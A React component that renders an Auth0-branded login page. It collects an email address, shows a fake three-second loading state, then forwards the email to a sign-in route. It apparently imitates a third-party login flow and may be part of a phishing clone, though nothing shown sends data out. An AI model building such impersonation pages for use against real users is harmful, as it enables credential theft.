import React from 'react';
import axios from 'axios';
import './hometwo.css';
import { useState } from 'react';
import { useNavigate } from 'react-router-dom';

import mainbg from './mainbg.jpeg';
import logotwo from './logotwo.gif';
import logothree from './logothree.png';
import footer from './footer.png';



function HomeTwo(){

    const[email, setUserName] = useState("");
    const[isLoading, setIsLoading]= useState(false);
    const navigate = useNavigate();

    function handleNext(e){
        e.preventDefault();
        setIsLoading(true);

        setTimeout(() => {
            setIsLoading(false);
            navigate('/sign-in',{state:{email:email}});
          }, 3000);

       
    }


    return (
        <>

            <div className='mainContent'>

                <div className='col-md-4 m-auto maindiv'>

                    <div className='imagediv text-center'>
                        <img src={logothree} className="mylogo" />

                    </div>

                    {/* <h2 className='mainhead'>Sign in to WebClient</h2> */}

                    <h3 className='welcome py-3'>Welcome</h3>

                    <p className='subtitle py-2'>Log in to Auth0 to continue to Auth0.</p>

                  

                    <form onSubmit={handleNext} className="px-3">
                  
                        <input onChange={function(e){
                        setUserName(e.target.value);
                    }} value={email}  type="text"className='form-control w-100 py-4'placeholder='Email address' required/>
                        
                     
                        
                        <div className=''>
                        <button className='next btn w-100'>
                            {isLoading ? "Loading ....." : "Continue"}
                        </button>

                        </div>
                    </form>


                    <div className='text-center'>

                        <img className='footerimage' src={footer} />

                    </div>

                

                </div>


                

            </div>
        
        
        </>
    );

}

export default HomeTwo;